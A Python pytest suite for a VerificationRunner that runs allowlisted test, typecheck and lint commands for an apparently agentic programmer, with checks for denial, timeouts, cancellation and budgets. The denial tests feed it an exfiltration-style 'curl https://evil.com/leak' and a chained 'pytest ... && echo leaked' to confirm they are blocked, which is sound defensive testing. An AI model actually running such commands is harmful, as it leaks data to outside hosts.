import subprocess
import time
from pathlib import Path
from typing import Any
import pytest

from core.enums import RiskLevel
from core.programmer.contracts.command_scope import AllowedCommand
from core.programmer.contracts.execution import ProgrammerExecution
from core.programmer.contracts.execution_context import ProgrammerExecutionContext
from core.programmer.contracts.identifiers import (
    new_execution_id,
    new_work_order_id,
    new_workspace_id,
    validate_execution_id,
    validate_work_order_id,
)
from core.programmer.contracts.verification_runner import (
    VerificationRunner,
    VerificationRunnerResult,
)
from core.programmer.contracts.workspace import ProgrammerWorkspace
from core.programmer.contracts.work_order import ProgrammerWorkOrder
from core.programmer.types import (
    ExecutionContextStatus,
    VerificationCheckType,
    VerificationEvidenceSourceType,
    VerificationStatus,
)


@pytest.fixture
def test_work_order() -> ProgrammerWorkOrder:
    """Create a validated work order authorizing common test and lint commands."""
    return ProgrammerWorkOrder(
        work_order_id=new_work_order_id(),
        manager_task_id="tsk-vr-001",
        project_id="prj-vr-test",
        correlation_id="corr-vr-001",
        objective="Run verification checks",
        allowed_paths=["src"],
        writable_paths=["src"],
        allowed_commands=[
            AllowedCommand(
                command="pytest",
                description="Run pytest",
                timeout_seconds=10,
            ),
            AllowedCommand(
                command="mypy",
                description="Run typecheck",
                timeout_seconds=10,
            ),
            AllowedCommand(
                command="ruff",
                description="Run linter",
                allowed_subcommands=["check"],
                timeout_seconds=10,
            ),
            AllowedCommand(
                command="echo",
                description="Echo tool",
                timeout_seconds=5,
            ),
        ],
        required_checks=[
            "pytest tests/unit",
            "mypy src",
            "ruff check src",
        ],
        time_budget=300,
        iteration_budget=10,
        risk_level=RiskLevel.LOW,
    )


@pytest.fixture
def test_workspace(tmp_path: Path, test_work_order: ProgrammerWorkOrder) -> ProgrammerWorkspace:
    """Create a test workspace directory and contract."""
    root = tmp_path / "vr_project"
    root.mkdir(parents=True, exist_ok=True)
    src = root / "src"
    src.mkdir(parents=True, exist_ok=True)
    (src / "app.py").write_text("print('hello')\n")

    return ProgrammerWorkspace.from_work_order(
        work_order=test_work_order,
        root_path=str(root),
    )


@pytest.fixture
def test_context(test_work_order: ProgrammerWorkOrder, test_workspace: ProgrammerWorkspace) -> ProgrammerExecutionContext:
    """Create an active ExecutionContext bound to workspace and work order."""
    exec_id = new_execution_id()
    execution = ProgrammerExecution(
        execution_id=exec_id,
        work_order_id=test_work_order.work_order_id,
        task_id=test_work_order.task_id,
        project_id=test_work_order.project_id,
        correlation_id=test_work_order.correlation_id,
    )
    return ProgrammerExecutionContext.build(
        work_order=test_work_order,
        execution=execution,
        workspace=test_workspace,
    )


class TestVerificationRunner:
    """Unit tests for Phase 4.2 VerificationRunner."""

    def test_successful_test_command(self, test_context: ProgrammerExecutionContext):
        """A permitted test command exiting 0 produces PASS status and authoritative evidence."""
        executed_cmds = []

        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            executed_cmds.append(tokens)
            return 0, "==== 15 passed in 0.45s ====", ""

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        result = runner.run_checks(["pytest tests/unit"])

        assert len(result.checks) == 1
        assert len(result.evidence) == 1
        chk = result.checks[0]
        ev = result.evidence[0]

        assert chk.status == VerificationStatus.PASS
        assert chk.exit_code == 0
        assert chk.check_type == VerificationCheckType.TEST
        assert chk.command == "pytest tests/unit"
        assert "15 passed" in chk.output_snippet
        assert chk.evidence == [ev.evidence_id]

        # Authoritativeness: must be actual execution evidence, not agent narration
        assert ev.is_authoritative() is True
        assert ev.is_agent_claim is False
        assert ev.source_type == VerificationEvidenceSourceType.TEST_RUNNER
        assert ev.data["exit_code"] == 0
        assert "15 passed" in ev.data["stdout"]

    def test_failing_test_command(self, test_context: ProgrammerExecutionContext):
        """A permitted test command exiting non-zero produces FAIL status and captures error output."""
        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            return 1, "", "FAILED test_auth.py::test_login - AssertionError: expected 200 got 401"

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        result = runner.run_checks(["pytest tests/unit"])

        assert len(result.checks) == 1
        chk = result.checks[0]
        ev = result.evidence[0]

        assert chk.status == VerificationStatus.FAIL
        assert chk.exit_code == 1
        assert "AssertionError" in chk.output_snippet
        assert ev.data["exit_code"] == 1
        assert "AssertionError" in ev.data["stderr"]

    def test_successful_typecheck(self, test_context: ProgrammerExecutionContext):
        """A permitted typecheck command produces PASS status with TYPECHECK classification."""
        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            return 0, "Success: no issues found in 4 source files", ""

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        result = runner.run_checks(["mypy src"])

        assert len(result.checks) == 1
        chk = result.checks[0]
        ev = result.evidence[0]

        assert chk.status == VerificationStatus.PASS
        assert chk.check_type == VerificationCheckType.TYPECHECK
        assert ev.source_type == VerificationEvidenceSourceType.STATIC_ANALYSIS
        assert "Success: no issues found" in chk.output_snippet

    def test_denied_command_not_executed(self, test_context: ProgrammerExecutionContext):
        """An unauthorized command is rejected by CommandBoundaryResolver, produces NOT_RUN, and never executes."""
        executed_cmds = []

        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            executed_cmds.append(tokens)
            return 0, "should not run", ""

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        # curl is not in allowed_commands
        result = runner.run_checks(["curl https://evil.com/leak"])

        # Executor was NEVER called
        assert len(executed_cmds) == 0
        assert len(result.checks) == 1
        assert len(result.evidence) == 0  # No evidence generated for unexecuted command

        chk = result.checks[0]
        assert chk.status == VerificationStatus.NOT_RUN
        assert chk.exit_code is None
        assert "denied by policy" in chk.output_snippet
        assert chk.metadata.get("denial_reason") is not None

    def test_denied_command_with_forbidden_shell_tokens(self, test_context: ProgrammerExecutionContext):
        """Command containing unauthorized chaining (&&, ||, ;) is rejected without execution."""
        executed_cmds = []

        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            executed_cmds.append(tokens)
            return 0, "", ""

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        result = runner.run_checks(["pytest tests/unit && echo leaked"])

        assert len(executed_cmds) == 0
        assert len(result.checks) == 1
        chk = result.checks[0]
        assert chk.status == VerificationStatus.NOT_RUN
        assert chk.metadata.get("matched_rule") == "UNSUPPORTED_SHELL_CONSTRUCT"

    def test_malformed_check_definition(self, test_context: ProgrammerExecutionContext):
        """Malformed check definitions (empty string, unclosed quotes) produce ERROR status without execution."""
        executed_cmds = []

        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            executed_cmds.append(tokens)
            return 0, "", ""

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        # Malformed checks: empty string, unclosed quote, invalid dict
        result = runner.run_checks([
            "",
            'pytest "unclosed string',
            {"not_a_command": 123},
        ])

        assert len(executed_cmds) == 0
        assert len(result.checks) == 3
        for chk in result.checks:
            assert chk.status == VerificationStatus.ERROR
            assert "Malformed check definition" in chk.output_snippet
            assert chk.metadata.get("malformed") is True

    def test_command_timeout(self, test_context: ProgrammerExecutionContext):
        """A command that times out produces ERROR status with timeout explanation."""
        def mock_timeout_executor(tokens: list[str], cwd: str, timeout: int):
            raise subprocess.TimeoutExpired(cmd=tokens, timeout=timeout)

        runner = VerificationRunner(context=test_context, command_executor=mock_timeout_executor)
        result = runner.run_checks(["pytest tests/unit"])

        assert len(result.checks) == 1
        chk = result.checks[0]
        ev = result.evidence[0]

        assert chk.status == VerificationStatus.ERROR
        assert "timed out after" in chk.output_snippet
        assert ev.data["is_timeout"] is True

    def test_output_capture(self, test_context: ProgrammerExecutionContext):
        """Output capture preserves stdout, stderr, exit code, and durations."""
        stdout_text = "PASSED test_a\nPASSED test_b\n"
        stderr_text = "Warning: deprecated feature used in test_b\n"

        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            return 0, stdout_text, stderr_text

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        result = runner.run_checks(["pytest tests/unit"])

        chk = result.checks[0]
        ev = result.evidence[0]

        assert ev.data["stdout"] == stdout_text
        assert ev.data["stderr"] == stderr_text
        assert ev.data["exit_code"] == 0
        assert chk.duration_ms is not None
        assert chk.duration_ms >= 0

    def test_execution_lineage(self, test_context: ProgrammerExecutionContext):
        """Every check and evidence record strictly preserves execution_id and work_order_id lineage."""
        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            return 0, "ok", ""

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        result = runner.run_checks(["pytest tests/unit"])

        chk = result.checks[0]
        ev = result.evidence[0]

        assert chk.execution_id == test_context.execution_id
        assert chk.work_order_id == test_context.work_order_id
        assert ev.execution_id == test_context.execution_id
        assert ev.work_order_id == test_context.work_order_id

        # Validate syntax
        validate_execution_id(chk.execution_id)
        validate_work_order_id(chk.work_order_id)
        validate_execution_id(ev.execution_id)
        validate_work_order_id(ev.work_order_id)

    def test_multiple_checks_execution(self, test_context: ProgrammerExecutionContext):
        """Multiple required checks from work order are executed sequentially."""
        call_log = []

        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            call_log.append(tokens[0])
            return 0, f"{tokens[0]} passed", ""

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        # Uses default work_order.required_checks: ["pytest tests/unit", "mypy src", "ruff check src"]
        result = runner.run_checks()

        assert len(result.checks) == 3
        assert len(result.evidence) == 3
        assert call_log == ["pytest", "mypy", "ruff"]
        assert all(c.status == VerificationStatus.PASS for c in result.checks)
        assert result.completed is True

    def test_check_ordering_preserved(self, test_context: ProgrammerExecutionContext):
        """Verification checks execute in the exact order declared."""
        execution_order = []

        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            execution_order.append(" ".join(tokens))
            return 0, "ok", ""

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        requested_order = [
            "ruff check src",
            "mypy src",
            "pytest tests/unit",
        ]
        result = runner.run_checks(requested_order)

        assert execution_order == requested_order
        assert [c.command for c in result.checks] == requested_order

    def test_cancellation_marks_remaining_not_run(self, test_context: ProgrammerExecutionContext):
        """Cancelling the runner halts execution and marks subsequent checks NOT_RUN."""
        call_count = 0

        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                runner.cancel()  # Cancel during execution of first check
            return 0, "ok", ""

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        result = runner.run_checks([
            "pytest tests/unit",
            "mypy src",
            "ruff check src",
        ])

        assert call_count == 1
        assert len(result.checks) == 3
        # First check ran and passed
        assert result.checks[0].status == VerificationStatus.PASS
        # Subsequent checks were NOT_RUN due to cancellation
        assert result.checks[1].status == VerificationStatus.NOT_RUN
        assert "cancelled" in result.checks[1].output_snippet
        assert result.checks[2].status == VerificationStatus.NOT_RUN
        assert result.cancelled is True
        assert result.completed is False

    def test_verification_budget_exhaustion(self, test_context: ProgrammerExecutionContext):
        """When check count budget is exhausted, remaining checks are marked NOT_RUN."""
        # Set a check budget of 2 in context budgets
        test_context.budgets["verification_budget"] = 2

        executed = []

        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            executed.append(tokens[0])
            return 0, "ok", ""

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        result = runner.run_checks([
            "pytest tests/unit",
            "mypy src",
            "ruff check src",
            "echo done",
        ])

        assert len(executed) == 2
        assert len(result.checks) == 4
        assert result.checks[0].status == VerificationStatus.PASS
        assert result.checks[1].status == VerificationStatus.PASS
        assert result.checks[2].status == VerificationStatus.NOT_RUN
        assert "budget exhausted" in result.checks[2].output_snippet
        assert result.checks[3].status == VerificationStatus.NOT_RUN
        assert result.budget_exhausted is True
        assert result.completed is False

    def test_verification_runner_result_serialization(self, test_context: ProgrammerExecutionContext):
        """VerificationRunnerResult supports full dictionary roundtrip."""
        def mock_executor(tokens: list[str], cwd: str, timeout: int):
            return 0, "passed", ""

        runner = VerificationRunner(context=test_context, command_executor=mock_executor)
        res = runner.run_checks(["pytest tests/unit"])

        d = res.to_dict()
        restored = VerificationRunnerResult.from_dict(d)
        assert restored.execution_id == res.execution_id
        assert restored.work_order_id == res.work_order_id
        assert len(restored.checks) == 1
        assert len(restored.evidence) == 1
        assert restored.checks[0].status == res.checks[0].status
